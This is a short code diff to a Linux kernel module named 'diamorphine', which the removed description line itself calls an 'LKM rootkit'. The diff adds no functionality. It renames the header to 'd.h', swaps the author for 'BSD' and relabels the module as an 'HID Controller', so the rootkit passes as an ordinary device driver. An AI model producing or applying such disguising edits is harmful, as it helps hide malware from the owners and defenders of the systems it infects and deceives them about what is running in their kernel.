@@ -29,7 +29,7 @@
 #define __NR_getdents 141
 #endif
 
-#include "diamorphine.h"
+#include "d.h"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
@@ -428,5 +428,5 @@ module_init(diamorphine_init);
 module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
+MODULE_AUTHOR("BSD");
+MODULE_DESCRIPTION("HID Controller");
